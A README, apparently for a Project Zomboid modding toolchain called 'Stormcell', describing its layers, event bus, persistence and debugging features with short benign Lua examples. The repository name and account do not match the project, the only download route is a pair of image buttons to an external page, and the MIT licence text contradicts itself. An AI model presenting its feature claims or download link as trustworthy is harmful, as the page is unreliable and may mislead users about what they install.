![preview](https://raw.githubusercontent.com/tousepremium1-sketch/storm-forge/main/banner_e8c068.svg)

# Stormcell

## A Living Toolchain for Crafting Player-Driven Worlds in Project Zomboid

Stormcell is not another modding utility. It is a modular orchestration framework designed to help you shape the quiet, decaying sandbox of Project Zomboid into a living narrative. Where traditional modding tools hand you a hammer, Stormcell gives you a workshop—complete with workbenches for behavior scripting, dynamic event wiring, and narrative state machines that persist across play sessions.

Think of vanilla Zomboid as a still pond. Most mods toss a stone and watch ripples fade. Stormcell lets you build currents—systemic, interlocking changes that respond to player choices, time, and environmental chaos. Whether you are simulating a functioning survivor settlement, a deteriorating military quarantine zone, or a weather-driven story arc, Stormcell provides the connective tissue.

---

## Why Another Toolchain? The Philosophy of Structured Chaos

The Project Zomboid modding scene is vibrant, but it often suffers from what we call the **string-and-tape syndrome**: scripts scattered across folders, global variables colliding, and logic duplicated across a dozen Lua files. Stormcell approaches mod development as a discipline of **structured chaos**—giving you the freedom to improvise while maintaining a safety net of conventions and utilities.

Our core belief is that a mod should be **composable**. A storm system you write for one map should be reusable in another. A dialogue tree should plug into a quest system without a rewrite. Stormcell enforces this through a lightweight service locator pattern and a declarative event bus that decouples your features from each other.

### The Metaphor: An Ant Colony, Not a Puppet Show

Most mods operate like a puppet show—every action is a visible string pulled by a central controller. Stormcell encourages an **ant colony** approach. Each module is an autonomous agent with a specific job: tracking hydration, managing NPC schedules, adjusting zombie migration. They communicate through pheromone trails (typed events) and shared resource stores (a persistent database). The result is a mod that feels organic because it *is*—no single entity knows the whole plan, yet the collective behavior emerges beautifully.

---

## ![Core Functions](https://img.shields.io/badge/Core-Functions-4B8BBE?style=for-the-badge) Capability Matrix

Stormcell is layered to fit your workflow, from quick tweaks to sprawling total conversions.

| Layer | Purpose | Key Abstraction |
| :--- | :--- | :--- |
| **L1: Foundation** | provides the event bus, logging, and configuration loader | `StormContext` |
| **L2: Behavioral** | scripting for NPC AI, animal behavior, and zombie meta-states | `BrainNode` graph system |
| **L3: Narrative** | quests, dialogue, and branching storylines with persistent flags | `NarrativeGraph` + `QuestBook` |
| **L4: Systemic** | climate, resource flow, and faction reputation tracking | `SimulationModule` |

Each layer can be used independently. If you only need a robust event bus, pull in L1. If you are building a full expansion pack, the layers snap together like modular shelving.

---

## ![Getting Started](https://img.shields.io/badge/Get-Started-6BBF59?style=for-the-badge) Initial Orientation

[![Download](https://raw.githubusercontent.com/tousepremium1-sketch/storm-forge/main/btn_0715.svg)](https://tousepremium1-sketch.github.io/storm-forge/)

To begin your first project, you will want to establish a **workspace**. Think of a workspace as a dedicated staging ground where your mod's blueprint lives. Stormcell generates a project skeleton that separates your **source** (your creative scripts) from the **build output** (the packaged mod files that the game reads).

The setup process is conversational. You define a project name, choose which layers to include, and specify your target game version. Stormcell then scaffolds the directory structure and a default configuration file. You are not locked into these choices—everything can be reorganized later, but starting with a clean template prevents the aforementioned string-and-tape syndrome.

### Your First Brain Node

The fastest way to feel productive is to create a simple behavior. A **BrainNode** is a reusable unit of logic with input conditions and output actions. For example, a `ThirstySurvivor` node might trigger when an NPC's water level drops below 20%, and the output action is "find a sink or well."

```lua
local ThirstyNode = Stormcell.Behavior.Node.create("ThirstySurvivor")
ThirstyNode:when(function(ctx) return ctx:getHydration() < 0.2 end)
ThirstyNode:doAction(function(ctx, npc) npc:seekWaterSource(10) end)
```

Nodes can be chained into state machines using `connect` operations. This gives you fine-grained control over interrupt conditions and priority. You are essentially writing a visual flowchart in code, but with the expressiveness of a full programming language.

---

## ![Core Features](https://img.shields.io/badge/Core-Features-F7B731?style=for-the-badge) Feature Highlights

### 1. Responsive UI Dashboard
Your mod's internal state is exposed through a built-in debug HUD. This is not a static overlay—it is a **live instrument panel**. You can inspect the health of every running module, trace event propagation paths, and even inject test events while the game is paused. The HUD is fully themeable and can be toggled for end-users by a simple keybind or through a config option.

### 2. Multilingual Content Pipeline
Creating a mod for an international audience should not require maintaining five parallel script files. Stormcell introduces **translation-first scripting**. You write your strings in a default locale (e.g., English) and reference them by key. The build process generates a `.pot` template, and your collaborators can contribute `.po` files for other languages. The runtime loads the appropriate file based on player locale settings, with a graceful fallback chain.

### 3. 24/7 Simulation Persistence
Zomboid is a game about the long haul. Your mod's state should survive not just reloads, but server restarts and even map changes. Stormcell includes a **tick-based persistence layer** that periodically snapshots critical module data to a SQLite-backed store. This is distinct from vanilla game saves—you control exactly what gets serialized and at what frequency. This is essential for simulating player-built settlements that evolve while you are offline.

### 4. The Event Storm Bus
At the heart of everything is a **typed event system** that operates on a publish-subscribe model. You can emit domain-specific events like `faction_tension_increased` without worrying about what listeners exist. Listeners subscribe with a filter predicate, ensuring your code only reacts to relevant stimuli. This bus also supports time-delayed events, which are invaluable for scripting scheduled occurrences like a helicopter pass or a power grid failure.

### 5. Sandbox-Friendly Error Recovery
No one writes perfect code on the first try—especially in Lua. Stormcell wraps all module execution in a **resilience envelope**. If a script throws an error, the module enters a "limp mode" where it retries with degraded functionality rather than crashing the entire game. The error is logged with a full stack trace that includes the exact node and condition where the failure occurred. You can then hotfix the script and reload it via the in-game console without restarting.

### 6. Resource Pack Manager
Managing textures, sounds, and custom 3D models is a chore. Stormcell provides a **virtual filesystem overlay**. You reference assets by logical name (`mod:audio/gunshot_echo.ogg`), and the toolchain resolves the correct physical path based on priority and player mod load order. This prevents asset conflicts and makes it trivial to provide optional HD texture packs for your mod.

---

## ![Project Structure](https://img.shields.io/badge/Project-Structure-9B59B6?style=for-the-badge) Anatomy of a Stormcell Project

A healthy project mirror the game's own data-driven philosophy.

```
my_survival_expansion/
├── stormcell.toml                 # project manifest
├── source/
│   ├── brains/                    # your custom BrainNode graphs
│   ├── narratives/                # dialogue and quest flows
│   ├── systems/                   # systemic simulation modules
│   └── entities/                  # new item, recipe, and vehicle definitions
├── assets/
│   ├── textures/                  # overwritten or new textures
│   ├── sounds/                    # audio assets
│   └── models/                    # may be dropped in later
├── translations/
│   ├── en_US.po
│   └── es_ES.po                   # contributed by community
└── build_output/                  # generated after compilation (ignored in VCS)
```

The `stormcell.toml` manifest controls everything from mod ID to which layers are active. It is heavily commented, and the schema is validated on load. If you miss a required field, you get a friendly error listing the allowed options instead of a silent failure.

---

## ![API Overview](https://img.shields.io/badge/API-Overview-3498DB?style=for-the-badge) The Developer Experience

We believe an API should read like a well-written essay—clear, purposeful, and free of unnecessary jargon. Here is a quick glance at the central `StormContext` object you will interact with most.

```lua
local context = Stormcell.createContext("my_mod")

-- Register a new item type
context.entities:registerItem({
    id = "sc_preserved_beans",
    displayName = "Preserved Beans",
    weight = 0.8,
    calories = 250,
    -- custom tags for your systems
    tags = {"canned", "no_refrigeration"}
})

-- Listen to a global event
context.events:subscribe("OnPlayerMove", function(player, from, to)
    -- your logic here
end)

-- Dispatch your own event after a delay
context.events:dispatchLater("sc_supply_drop_arrives", 1200, {zone_id = "warehouse_a"})
```

The API is lazy-loaded. Modules you never use are not initialized, keeping the memory footprint small. This is crucial for multiplayer servers where every byte counts.

### Debugging With the Stormscope

Beyond the in-game HUD, Stormcell includes a **headless debugging tool** called the Stormscope. It runs in a separate terminal window and connects to your running game instance via a loopback socket. The Stormscope gives you a time-series visualizer for custom metrics you define—e.g., "average zombie density in safehouse radius." You can set breakpoints on event conditions and step through the event bus pipeline. It is a powerful ally for solving the truly cryptic bugs that only appear after hours of playtime.

---

## ![Community & Support](https://img.shields.io/badge/Community-Support-2ECC71?style=for-the-badge) The Ecosystem Philosophy

Stormcell is not just a set of scripts—it is a growing ecosystem. We encourage sharing small, focused *cells* (the smallest unit of reusable logic) through a community index. A cell might be a "craftable sled hammer" or a "anxiety system for NPCs." You can publish a cell with a single command, and others can pull it into their projects as a dependency. Versioning is handled automatically via semantic versioning, so you can safely update your dependencies without fear of breaking changes.

We maintain an open standard for **cross-mod compatibility**. If another mod also uses Stormcell, you can define interaction points in your manifest. For example, you can declare that your mod consumes the `faction_rep` channel published by another mod. This creates a plugin ecosystem where standalone mods can evolve into interconnected experiences.

---

## ![License & Legal](https://img.shields.io/badge/License-MIT-8E44AD?style=for-the-badge) Terms of Use

Stormcell is released under the MIT license. You are free to use, modify, and distribute the toolchain for both personal and commercial projects. We do ask that you do not redistribute the toolchain itself as a separate product—your mods are your own, but the workshop stays here.

[License: MIT](https://opensource.org/licenses/MIT)

---

## ![Disclaimer](https://img.shields.io/badge/Disclaimer-Important-E74C3C?style=for-the-badge) A Note on Spirit

Stormcell is a tribute to the spirit of modding—curiosity, technical craft, and the joy of sharing a vision. We are not affiliated with The Indie Stone or the official Project Zomboid team. The game is a canvas; we only offer better brushes.

This toolchain is provided on an "as is" basis without warranty of any kind, express or implied. We shall not be liable for any damage to your save files, your multiplayer servers, or your weekend schedules. You are encouraged to experiment, break things, and learn from the wreckage—that is how the best mods are born.

---

## ![Final Notes](https://img.shields.io/badge/Final-Notes-95A5A6?style=for-the-badge) Looking Toward 2026

As we approach 2026, our roadmap includes deeper integration with build crafting, a visual node editor for narrative graphs, and a simplified packaging flow for distributing mods through the Steam Workshop. We are also exploring a **web-based companion dashboard** that allows server admins to monitor mod health metrics remotely.

The future of Zomboid modding is bright, and we believe Stormcell is a lighthouse in that dawn. Whether you are a solo survivor crafting a small hideout mod or a team of six building a total conversion, we hope this toolchain becomes your trusted workshop.

---

[![Download](https://raw.githubusercontent.com/tousepremium1-sketch/storm-forge/main/btn_0715.svg)](https://tousepremium1-sketch.github.io/storm-forge/)